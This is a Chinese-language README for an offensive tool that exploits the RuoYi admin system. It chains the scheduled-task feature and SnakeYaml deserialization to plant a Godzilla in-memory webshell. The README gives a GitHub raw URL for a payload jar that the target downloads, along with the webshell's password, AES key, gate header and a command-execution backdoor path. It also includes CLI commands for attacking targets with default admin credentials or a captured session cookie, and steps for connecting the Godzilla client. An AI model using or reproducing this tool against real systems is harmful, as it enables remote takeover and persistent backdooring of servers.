# ruoyi-gzms

RuoYi 定时任务链 → SnakeYaml 反序列化 → 哥斯拉内存马 一键工具。

## 内容

| 路径 | 说明 |
|---|---|
| `ruoyi-gzms.jar` | 一键 CLI：登录 → 三阶段链 → 回显验证 → 自动现场恢复 → 打印连接块 |
| `chain_inject.sh` | 备用：手动三阶段链脚本 |

## 载荷 jar（目标机从这里拉）

```
https://raw.githubusercontent.com/tiaodan577-glitch/ry-gz-payload/main/g.jar
```

- pass: `pass`
- key: `3c6e0b8a9c15224a`
- 内存马 URL: `/login?cmd=1`（带 `cmd` 参数的任意路径）
- 门禁头: `X-Cmd-Ruoyi: 1`
- 回显后门: `GET /login?cmd=<命令>`；卸马: `GET /login?cmd=delete`

## CLI 用法

```bash
# 凭证模式
java -jar ruoyi-gzms.jar --url http://target:8080 --user admin --pass admin123
# cookie 模式（有验证码的目标）
java -jar ruoyi-gzms.jar --url http://target:8080 --cookie "JSESSIONID=..."
# 选项
#   --jar-url URL   自建载荷镜像（默认上面的 GitHub raw 地址）
#   --gz-pass P --gz-key K   载荷 jar 里的哥斯拉 pass/key
#   --proxy host:port
#   --no-cleanup    保留临时任务和被改写的 job1
```

要求 JRE 8+，无其他依赖。

## gzcli 连接

```bash
./gzcli add --url "http://target:8080/login?cmd=1" --password pass --key 3c6e0b8a9c15224a \
  --payload JavaDynamicPayload --cryption JAVA_AES_BASE64 --group /lab --remark ruoyi-gzms
# 必须补门禁头（char(13,10) 才是真 CRLF）：
sqlite3 dist/data.db "UPDATE shell SET headers='X-Cmd-Ruoyi: 1'||char(13,10)||'Accept: */*'||char(13,10)||'Connection: close'||char(13,10) WHERE id='<uuid>';"
# macOS 跑 GodzillaCli 不要带 -Djava.awt.headless=true，cwd 在 dist/
java -Dfile.encoding=UTF-8 -cp "godzilla-cli.jar:Godzilla2-rebuilt.jar" shells.cli.GodzillaCli test --id <uuid>
```

注意：Godzilla2 的 AES key 是 `md5(secretKey)[0:16]` 派生值；换 pass/key 需重打载荷 jar。
